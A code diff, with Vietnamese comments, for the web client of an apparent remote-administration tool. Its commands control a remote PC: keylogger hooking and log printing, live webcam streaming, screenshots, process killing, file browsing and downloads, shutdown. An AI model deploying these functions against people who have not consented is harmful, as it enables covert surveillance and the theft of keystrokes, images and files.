@@ -2,7 +2,7 @@
 let currentWindow = 0;
 let ws = null;
 let currentAction = ''; 
-let isInSubMenu = false; // Biến này dùng để check xem ta đang ở Main hay Sub
+let isInSubMenu = false;
 let isKeylogHooked = false;
 let isWebcamActive = false;
 
@@ -71,7 +71,7 @@ function handleServerMessage(msg) {
                 document.getElementById('mainContainer').classList.add('active');
                 updateStatus(true);
                 showToast("Connected to Server", "success");
-                isInSubMenu = false; // Mới vào thì chắc chắn ở Main Menu
+                isInSubMenu = false;
             }, 500);
         } else {
             disconnectUI();
@@ -88,26 +88,19 @@ function handleServerMessage(msg) {
     else if (msg.type === "LOG") {
         const data = msg.data;
         console.log("[LOG] Data received, length:", data.length, "pendingFileDownload:", pendingFileDownload);
-        
-        // 1. XỬ LÝ PHẢN HỒI LỆNH (KILL/START SUCCESS)
         if (data.includes("successfully") || data.includes("Error:") || data.includes("Unable to")) {
             const isError = data.toLowerCase().includes("error") || data.includes("Unable");
             showToast(data.trim(), isError ? "error" : "success");
-            
-            // Gọi hàm refresh (đã được tối ưu bên dưới)
             setTimeout(() => refreshListAfterAction(), 300);
             return;
         }
         if (currentWindow === 3) {
-            // Nếu data ngắn và là số -> Là kích thước file (bỏ qua hoặc log)
             if (data.length < 100 && !isNaN(data)) {
                 console.log("Incoming image size: " + data);
                 return;
             }
-            // Nếu data dài -> Là Base64 ảnh
             if (data.length > 100) {
                 const display = document.getElementById('screenshotDisplay');
-                // Hiển thị ảnh
                 display.innerHTML = `<img src="data:image/png;base64,${data}" alt="Screenshot" style="max-width:100%; border-radius:10px;">`;
                 display.classList.add('show');
                 document.getElementById('screenshotActions').style.display = 'flex';
@@ -115,19 +108,13 @@ function handleServerMessage(msg) {
             }
             return;
         }
-
-        // 3. XỬ LÝ WEBCAM (Tab index 4)
         if (currentWindow === 4) {
-             // Webcam gửi luồng liên tục, ta cập nhật src của ảnh liên tục để tạo video
-             // Lưu ý: Server C++ của bạn đang gửi từng frame MJPEG
              if (data.length > 100) {
                 const videoImg = document.getElementById('webcamTarget'); // Ta sẽ dùng thẻ img thay vì video để render MJPEG
                 if(videoImg) videoImg.src = `data:image/jpeg;base64,${data}`;
              }
              return;
         }
-
-        // 2. XỬ LÝ KEYLOG
         if (parsingMode === 'KEYLOG') {
             const keylogOut = document.getElementById('keylogOutput');
             let formatted = data.replace(/\n/g, "<br>");
@@ -135,16 +122,12 @@ function handleServerMessage(msg) {
             keylogOut.scrollTop = keylogOut.scrollHeight;
             return;
         }
-
-        // 3. XỬ LÝ DOWNLOAD FILE (PHẢI KIỂM TRA TRƯỚC)
         if (pendingFileDownload && data.length > 10) {
             console.log("[DOWNLOAD] Received Base64 data, length:", data.length);
             console.log("[DOWNLOAD] First 50 chars:", data.substring(0, 50));
             handleFileDownload(data);
             return;
         }
-
-        // 4. XỬ LÝ FILE MANAGER - DRIVES LIST
         if (parsingMode === 'DRIVES') {
             if (data.trim() === 'DRIVELIST') {
                 document.getElementById('fileList').innerHTML = '';
@@ -157,8 +140,6 @@ function handleServerMessage(msg) {
             }
             return;
         }
-
-        // 5. XỬ LÝ FILE MANAGER - FILE/FOLDER LIST
         if (parsingMode === 'FILE') {
             if (data.trim() === 'FILELIST') {
                 document.getElementById('fileList').innerHTML = '';
@@ -166,15 +147,13 @@ function handleServerMessage(msg) {
             }
             const parts = data.split('|');
             if (parts.length === 3) {
-                const type = parts[0];  // DIR hoặc FILE
+                const type = parts[0];
                 const name = parts[1];
                 const size = parts[2];
                 renderFileItem(type, name, size);
             }
             return;
         }
-
-        // 6. XỬ LÝ DANH SÁCH (PROCESS / APP)
         if (parsingMode === 'PROCESS' || parsingMode === 'APP') {
             if (expectedItems === 0) {
                 if (!isNaN(data.trim()) && parseInt(data.trim()) > 0) {
@@ -208,19 +187,15 @@ function handleServerMessage(msg) {
             const data = msg.data;
             
             if (data === "END_INFO") {
-                // Đã nhận xong toàn bộ -> Render ra màn hình
                 document.getElementById('systemInfoGrid').innerHTML = tempInfoHtml;
                 parsingMode = null;
                 showToast("System Info Updated", "success");
             } 
             else if (data.startsWith("KEY:")) {
-                // Parse format: "KEY:Label|Value"
                 const parts = data.substring(4).split('|');
                 if (parts.length >= 2) {
                     const label = parts[0];
                     const value = parts[1];
-                    
-                    // Chọn icon dựa trên label
                     let icon = '💻';
                     if (label.includes('CPU')) icon = '⚙️';
                     if (label.includes('RAM')) icon = '💾';
@@ -272,39 +247,25 @@ function renderListItem(data) {
     }
 }
 
-// --- HÀM REFRESH ĐƠN GIẢN ---
 function refreshListAfterAction() {
-    // Chỉ cần gọi lại Show. Logic thông minh nằm trong hàm Show.
     if (parsingMode === 'APP') showAppList(); 
     else showProcessList();
 }
 
-// --- LOGIC HIỂN THỊ LIST (ĐÃ SỬA LỖI 2 QUIT) ---
 function showProcessList() {
-    // 1. Reset UI
     document.getElementById('processList').style.display = 'block';
     document.getElementById('processList').innerHTML = '<div class="loading-text">⟳ Fetching processes...</div>';
     parsingMode = 'PROCESS';
     expectedItems = 0;
     currentItemsReceived = 0;
-
-    // 2. Logic xử lý Server State
     if (!isInSubMenu) {
-        // TRƯỜNG HỢP A: Đang ở Main Menu -> Vào thẳng
         ws.send("CMD|PROCESS");
         isInSubMenu = true;
         setTimeout(() => ws.send("CMD|XEM"), 300);
     } else {
-        // TRƯỜNG HỢP B: Đang ở Sub Menu (hoặc kẹt ở Kill)
-        // Gửi ĐÚNG 1 lệnh QUIT.
-        // - Nếu đang ở Process -> Ra Main.
-        // - Nếu đang ở Kill -> Ra Process.
         ws.send("CMD|QUIT");
         
         setTimeout(() => {
-            // Sau khi QUIT, ta gửi lệnh PROCESS.
-            // - Nếu nãy ra Main -> Giờ vào Process (Đúng ý).
-            // - Nếu nãy ra Process -> Giờ gửi "PROCESS" (Server Process loop ko hiểu lệnh này -> Bỏ qua -> Vẫn ở Process) (Không sao cả).
             ws.send("CMD|PROCESS");
             isInSubMenu = true;
 
@@ -321,7 +282,6 @@ function showAppList() {
     parsingMode = 'APP';
     expectedItems = 0;
     currentItemsReceived = 0;
-
     if (!isInSubMenu) {
         ws.send("CMD|APPLICATION");
         isInSubMenu = true;
@@ -339,9 +299,6 @@ function showAppList() {
 function showInput(action) {
     if (action.includes('App')) parsingMode = 'APP';
     else parsingMode = 'PROCESS';
-
-    // Đảm bảo đã vào menu con.
-    // Nếu chưa vào (ví dụ người dùng bấm Kill ngay khi vừa kết nối)
     if (!isInSubMenu) {
         if (parsingMode === 'APP') ws.send("CMD|APPLICATION");
         else ws.send("CMD|PROCESS");
@@ -371,8 +328,6 @@ function submitInput() {
     closeModal();
     const value = document.getElementById('modalInput').value.trim();
     if (!value) return;
-
-    // Gửi lệnh + ID. Không gửi QUIT.
     if (currentAction.includes('kill')) {
         ws.send("CMD|KILL");
         setTimeout(() => ws.send("CMD|KILLID"), 50);
@@ -395,7 +350,6 @@ function connect() {
 }
 
 function disconnect() {
-    // Reset an toàn khi disconnect
     if(isInSubMenu) ws.send("CMD|QUIT"); 
     isInSubMenu = false;
     setTimeout(() => ws.send("DISCONNECT|"), 200);
@@ -421,13 +375,7 @@ function updateStatus(connected) {
 
 function navigateTo(index) {
     if (currentWindow === index) return;
-
-    // --- BƯỚC 1: DỌN DẸP TAB CŨ (Logic cũ giữ nguyên nhưng tinh chỉnh) ---
-    
-    // Nếu đang ở Keylog (2) hoặc Webcam (4) hoặc Chat (5) -> Gửi QUIT để thoát vòng lặp Server
     if (currentWindow === 2 || currentWindow === 4 || currentWindow === 5 || isInSubMenu) {
-        
-        // Tắt Hook/Webcam nếu quên tắt (Logic an toàn từ bước trước)
         if (currentWindow === 2 && isKeylogHooked) {
             ws.send("CMD|UNHOOK");
             isKeylogHooked = false;
@@ -437,51 +385,34 @@ function navigateTo(index) {
             isWebcamActive = false;
             document.getElementById('liveIndicator').classList.remove('active');
         }
-
-        // Thoát menu hiện tại
         ws.send("CMD|QUIT");
         isInSubMenu = false;
     }
-
-    // --- BƯỚC 2: THIẾT LẬP TAB MỚI ---
-    
-    // Reset chế độ parse dữ liệu
     parsingMode = null;
-    
-    // Thực hiện chuyển cảnh UI
     performUITransition(index); 
-
-    // [QUAN TRỌNG] Gửi lệnh vào Menu ngay lập tức
-    if (index === 2) { 
-        // Tab Keylog
+    if (index === 2) {
         ws.send("CMD|KEYLOG");
-        isInSubMenu = true; // Đánh dấu là đã vào menu con
+        isInSubMenu = true;
         console.log("Entered Keylog Menu");
     } 
     else if (index === 4) {
-        // Tab Webcam
         ws.send("CMD|WEBCAM");
         isInSubMenu = true;
         console.log("Entered Webcam Menu");
     }
     else if (index === 5) {
-        // Tab Chat
         ws.send("CMD|CHAT");
         isInSubMenu = true;
-        setTimeout(() => startChatSession(), 300); // Chat có thể cần init UI
+        setTimeout(() => startChatSession(), 300);
     }
     else if (index === 6) {
-        // Tab File Manager
-        // File Manager không cần vào menu ngay, chờ user click nút
         console.log("Entered File Manager");
     }
     else if (index === 7) {
-        // Tab System Info
         fetchSystemInfo();
     }
 }
 function enterNewTab(index) {
-    // XỬ LÝ KHI VÀO TAB MỚI
     if (index == 5) {
         setTimeout(() => startChatSession(), 50);
     }
@@ -490,14 +421,10 @@ function enterNewTab(index) {
     }
     performUITransition(index);
 }
-
-// Hàm phụ trách việc trượt giao diện (Tách ra để tái sử dụng)
 function performUITransition(index) {
     currentWindow = index;
     const wrapper = document.getElementById('windowsWrapper');
     wrapper.style.transform = `translateX(-${index * 100}vw)`;
-    
-    // Cập nhật thanh gạch chân (Indicator)
     const buttons = document.querySelectorAll('.nav-btn');
     const btn = buttons[index];
     const indicator = document.getElementById('navIndicator');
@@ -506,30 +433,21 @@ function performUITransition(index) {
         indicator.style.left = btn.offsetLeft + 'px';
     }
 }
-
-// --- ACTIONS KEYLOG ---
 function hookKeylog() {
     if (isKeylogHooked) return showToast('Keylog is already running', 'warning');
-    
-    // Chỉ gửi lệnh HOOK ngay lập tức
     ws.send("CMD|HOOK");
-    
     isKeylogHooked = true;
     showToast('Keylog Hooked', 'success');
 }
 
 function unhookKeylog() {
     if (!isKeylogHooked) return showToast('Keylog is NOT running', 'error');
-
-    // Chỉ gửi lệnh UNHOOK
     ws.send("CMD|UNHOOK");
-    
     isKeylogHooked = false;
     showToast('Keylog Unhooked', 'warning');
 }
 
 function printKeylog() {
-    
     parsingMode = 'KEYLOG'; 
     const output = document.getElementById('keylogOutput');
     output.style.display = 'block';
@@ -537,9 +455,7 @@ function printKeylog() {
         output.innerHTML += '<div class="log-separator">---------------- NEW SESSION ----------------</div>';
     }
     output.scrollTop = output.scrollHeight;
-
     ws.send("CMD|PRINT");
-
 }
 
 function deleteLogs() {
@@ -561,8 +477,6 @@ function restartServer() {
         setTimeout(() => ws.send("CMD|RESTART"), 300);
     }
 }
-
-// --- INIT ---
 window.onload = () => {
     initWebSocket();
     document.getElementById('modalInput').value = '';
@@ -570,13 +484,9 @@ window.onload = () => {
     if(btn) document.getElementById('navIndicator').style.width = btn.offsetWidth + 'px';
 };
 function handleModalEnterKey(e) { if(e.key==='Enter') submitInput(); }
-// --- SCREENSHOT ACTIONS ---
 function captureScreenshot() {
-    // 1. Vào Menu TAKEPIC
     ws.send("CMD|TAKEPIC");
     isInSubMenu = true;
-
-    // 2. Gửi lệnh chụp (TAKE) sau 200ms
     showToast("Capturing screen...", "info");
     setTimeout(() => {
         ws.send("CMD|TAKE");
@@ -586,7 +496,6 @@ function captureScreenshot() {
 function saveScreenshot() {
     const img = document.querySelector('#screenshotDisplay img');
     if (img) {
-        // Cho phép người dùng đặt tên file
         const fileName = prompt("Enter filename:", `screenshot_${new Date().getTime()}`);
         if (fileName) {
             const link = document.createElement('a');
@@ -605,12 +514,8 @@ function deleteScreenshot() {
     document.getElementById('screenshotActions').style.display = 'none';
     showToast("Screenshot cleared", "info");
 }
-
-// --- WEBCAM ACTIONS ---
 function startWebcam() {
     if (isWebcamActive) return showToast('Webcam is already streaming', 'warning');
-
-    // Setup UI
     const container = document.getElementById('webcamVideo').parentNode;
     if (!document.getElementById('webcamTarget')) {
         const img = document.createElement('img');
@@ -620,10 +525,7 @@ function startWebcam() {
         container.appendChild(img);
         document.getElementById('webcamVideo').style.display = 'none';
     }
-
-    // Chỉ gửi lệnh START (Server đã ở trong vòng lặp Webcam từ lúc chọn Tab)
     ws.send("CMD|START");
-    
     document.getElementById('liveIndicator').classList.add('active');
     isWebcamActive = true;
     showToast("Webcam started", "success");
@@ -653,13 +555,10 @@ function fetchSystemInfo() {
         ws.send("CMD|INFO");
     }, 200);
 }
-
-// --- SYSTEM CONTROL ---
 function shutdownServer() {
     if(confirm("Are you sure you want to SHUTDOWN the remote PC?")) {
-        // Lệnh Shutdown thường là lệnh 1 chiều, Server sẽ tắt ngay
         if (isInSubMenu) {
-            ws.send("CMD|QUIT"); // Thoát menu con nếu đang kẹt
+            ws.send("CMD|QUIT");
             setTimeout(() => ws.send("CMD|SHUTDOWN"), 200);
         } else {
             ws.send("CMD|SHUTDOWN");
@@ -669,28 +568,22 @@ function shutdownServer() {
 }
 
 function restartServer() {
-    // Server.cpp của bạn hiện tại chưa expose lệnh RESTART ra ngoài vòng lặp chính
-    // Nhưng nếu bạn update server, logic sẽ như sau:
     if(confirm("Are you sure you want to RESTART the remote PC?")) {
          if (isInSubMenu) {
             ws.send("CMD|QUIT");
-            setTimeout(() => ws.send("CMD|RESTART"), 200); // Server cần handle chuỗi này
+            setTimeout(() => ws.send("CMD|RESTART"), 200); 
         } else {
             ws.send("CMD|RESTART");
         }
         showToast("Restart command sent", "success");
     }
 }
-
-// --- HÀM SHOW TOAST (BỊ THIẾU) ---
 function showToast(message, type = 'info', persistent = false) {
     const container = document.getElementById('toastContainer');
     if (!container) return null;
 
     const toast = document.createElement('div');
     toast.className = `toast ${type}`;
-    
-    // Chọn icon tương ứng
     let icon = 'ℹ️';
     if (type === 'success') icon = '✓';
     else if (type === 'error') icon = '✕';
@@ -704,13 +597,9 @@ function showToast(message, type = 'info', persistent = false) {
     `;
 
     container.appendChild(toast);
-
-    // Hiệu ứng hiện ra
     requestAnimationFrame(() => {
         toast.classList.add('show');
     });
-
-    // Tự động biến mất sau 3 giây (trừ khi persistent = true)
     if (!persistent) {
         setTimeout(() => {
             toast.classList.remove('show');
@@ -730,14 +619,9 @@ function hideToast(toast) {
         if (toast.parentNode) toast.parentNode.removeChild(toast);
     }, 400);
 }
-
-// --- CHAT FUNCTIONS ---
 function startChatSession() {
-    // 1. Vào Menu CHAT
     ws.send("CMD|CHAT");
     isInSubMenu = true;
-    
-    // 2. Gửi lệnh hiện cửa sổ sau 1 chút
     setTimeout(() => {
         ws.send("CMD|START");
         document.getElementById('chatMessages').innerHTML = '<div class="chat-bubble system">Connecting to chat service...</div>';
@@ -748,45 +632,30 @@ function sendChatMessage() {
     const input = document.getElementById('chatInput');
     const text = input.value.trim();
     if (!text) return;
-
-    // Gửi lệnh: CMD | MSG | Nội dung
-    // Backend server.cpp cần xử lý prefix "MSG|"
     ws.send(`CMD|MSG|${text}`); 
-    
-    // Hiện lên UI của mình
     addChatBubble(text, 'me');
     input.value = '';
 }
 
-function handleChatKey(e) {
+function handleChatKey(e) { 
     if (e.key === 'Enter') sendChatMessage();
 }
 
 function addChatBubble(text, type) {
     const container = document.getElementById('chatMessages');
     const div = document.createElement('div');
-    
-    // Nếu là tin từ server, nó có thể có prefix "[Server]:", ta có thể lọc nếu muốn
     div.className = `chat-bubble ${type}`;
     div.textContent = text;
-    
     container.appendChild(div);
     container.scrollTop = container.scrollHeight;
 }
-
-// --- FILE MANAGER FUNCTIONS ---
 function browseFiles(path) {
     if (!path) path = currentFilePath;
-    
-    // Đảm bảo path kết thúc bằng 1 backslash
     if (!path.endsWith("\\")) path += "\\";
-    
     currentFilePath = path;
     document.getElementById('currentPath').value = path;
-    
     const fileList = document.getElementById('fileList');
     fileList.innerHTML = '<div class="loading-text">⟳ Loading...</div>';
-    
     if (!isInSubMenu) {
         ws.send("CMD|FILE");
         isInSubMenu = true;
@@ -805,14 +674,12 @@ function browseFiles(path) {
             }, 200);
         }, 200);
     }
-    
     parsingMode = 'FILE';
 }
 
 function listDrives() {
     const fileList = document.getElementById('fileList');
     fileList.innerHTML = '<div class="loading-text">⟳ Loading drives...</div>';
-    
     if (!isInSubMenu) {
         ws.send("CMD|FILE");
         isInSubMenu = true;
@@ -825,7 +692,6 @@ function listDrives() {
             setTimeout(() => ws.send("CMD|DRIVES"), 200);
         }, 200);
     }
-    
     parsingMode = 'DRIVES';
     document.getElementById('currentPath').value = 'My Computer';
 }
@@ -841,20 +707,14 @@ function navigateToPath() {
 
 function navigateUp() {
     let path = currentFilePath;
-    // Loại bỏ trailing backslash
     if (path.endsWith("\\")) path = path.slice(0, -1);
-    
-    // Tìm vị trí backslash cuối cùng
     const lastSlash = path.lastIndexOf("\\");
     if (lastSlash > 0) {
-        // Quay về thư mục cha
         path = path.substring(0, lastSlash);
         browseFiles(path);
     } else if (path.length > 2) {
-        // Quay về root drive (C:, D:, etc.)
         browseFiles(path.substring(0, 2));
     } else {
-        // Đã ở root drive, quay về danh sách drives
         listDrives();
     }
 }
@@ -863,11 +723,8 @@ function renderFileItem(type, name, size) {
     const fileList = document.getElementById('fileList');
     const icon = type === 'DIR' ? '📁' : '📄';
     const sizeStr = type === 'DIR' ? '' : formatFileSize(parseInt(size));
-    
-    const escapedName = name.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;');
-    
+    const escapedName = name.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;'); 
     const onclick = type === 'DIR' ? `openFolder('${escapedName}')` : `downloadFile('${escapedName}')`;
-    
     const html = `
         <div class="file-row" onclick="${onclick}">
             <div class="file-icon">${icon}</div>
@@ -882,9 +739,7 @@ function renderFileItem(type, name, size) {
 function renderDriveItem(driveLetter) {
     const fileList = document.getElementById('fileList');
     const icon = '💾';
-    // Drive path: C:, D:, etc. (không có trailing backslash, browseFiles sẽ thêm)
     const drivePath = driveLetter;
-    
     const html = `
         <div class="file-row drive-row" onclick="browseFiles('${drivePath}')">
             <div class="file-icon">${icon}</div>
@@ -897,21 +752,15 @@ function renderDriveItem(driveLetter) {
 }
 
 function openFolder(folderName) {
-    // currentFilePath đã có trailing backslash từ browseFiles()
     let newPath = currentFilePath + folderName;
     browseFiles(newPath);
 }
 
 function downloadFile(fileName) {
-    // currentFilePath đã có trailing backslash từ browseFiles()
     let filePath = currentFilePath + fileName;
-    
-    // Hiện toast persistent (không tự động mất)
     if (downloadingToast) hideToast(downloadingToast);
     downloadingToast = showToast("Downloading " + fileName + "...", "info", true);
     pendingFileDownload = fileName;
-    
-    // Kiểm tra xem đã ở trong FILE menu chưa
     if (!isInSubMenu) {
         ws.send("CMD|FILE");
         isInSubMenu = true;
@@ -920,7 +769,6 @@ function downloadFile(fileName) {
             setTimeout(() => ws.send("CMD|" + filePath), 100);
         }, 200);
     } else {
-        // Đã ở trong FILE menu rồi, gửi lệnh trực tiếp
         ws.send("CMD|DOWNLOAD");
         setTimeout(() => ws.send("CMD|" + filePath), 100);
     }
@@ -931,34 +779,25 @@ function handleFileDownload(base64Data) {
         console.error("[DOWNLOAD] No pending download!");
         return;
     }
-    
     console.log("[DOWNLOAD] Starting download for:", pendingFileDownload);
     console.log("[DOWNLOAD] Base64 length:", base64Data.length);
-    
     try {
         const binaryString = atob(base64Data);
         console.log("[DOWNLOAD] Decoded binary length:", binaryString.length);
-        
         const bytes = new Uint8Array(binaryString.length);
         for (let i = 0; i < binaryString.length; i++) {
             bytes[i] = binaryString.charCodeAt(i);
         }
-        
         console.log("[DOWNLOAD] Created Uint8Array, size:", bytes.length);
-        
         const blob = new Blob([bytes]);
         console.log("[DOWNLOAD] Created Blob, size:", blob.size);
-        
         const url = URL.createObjectURL(blob);
         const link = document.createElement('a');
         link.href = url;
         link.download = pendingFileDownload;
         link.click();
         URL.revokeObjectURL(url);
-        
         console.log("[DOWNLOAD] Download triggered successfully");
-        
-        // Ẩn toast đang downloading và hiện toast success
         if (downloadingToast) {
             hideToast(downloadingToast);
             downloadingToast = null;
